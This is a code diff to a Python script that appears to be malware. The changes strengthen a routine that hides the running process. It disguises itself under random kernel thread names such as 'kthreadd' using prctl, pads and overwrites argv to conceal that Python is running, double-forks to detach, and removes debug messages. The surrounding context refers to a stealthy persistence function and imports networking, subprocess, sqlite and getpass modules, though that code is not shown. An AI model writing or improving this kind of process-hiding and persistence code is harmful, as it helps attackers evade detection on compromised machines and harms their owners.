@@ -2,16 +2,26 @@
 import os, sys, ctypes, random, base64
 
 # Immediate stealth - before any other imports
-def immediate_stealth():
+def comprehensive_stealth():
     try:
-        # Clear command line arguments
+        # Choose a legitimate system process name
         new_name = random.choice(["systemd", "kthreadd", "ksoftirqd", "migration"])
-        sys.argv = [new_name]
         
-        # Change process name
+        # 1. Change process name using prctl
         ctypes.CDLL(None).prctl(15, new_name.encode())
         
-        # Fork to detach
+        # 2. Overwrite argv to completely hide Python
+        import sys
+        # Create a new argv with our fake name
+        new_argv = [new_name]
+        # Pad with empty strings to overwrite all original arguments
+        while len(new_argv) < len(sys.argv):
+            new_argv.append("")
+        
+        # Replace the original argv
+        sys.argv = new_argv
+        
+        # 3. Fork to detach
         pid = os.fork()
         if pid > 0:
             os._exit(0)
@@ -23,17 +33,16 @@ def immediate_stealth():
                 os._exit(0)
             elif pid == 0:
                 # Second child continues
+                # Change process name again in the final process
+                ctypes.CDLL(None).prctl(15, new_name.encode())
                 return True
             else:
                 # Second fork failed
-                print_debug("Second fork failed")
                 return False
         else:
             # First fork failed
-            print_debug("First fork failed")
             return False
     except Exception as e:
-        print_debug(f"Stealth initialization failed: {e}")
         return False
 
 # Apply stealth immediately
@@ -399,8 +408,8 @@ def create_stealthy_persistence():
     except Exception as e:
         print_debug(f"Failed to create stealthy persistence: {e}")
         return False
-    
-immediate_stealth()
+
+comprehensive_stealth()
 
 import os, sys, json, base64, time, random, urllib, urllib.request, urllib.error, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
 from urllib.parse import urlencode
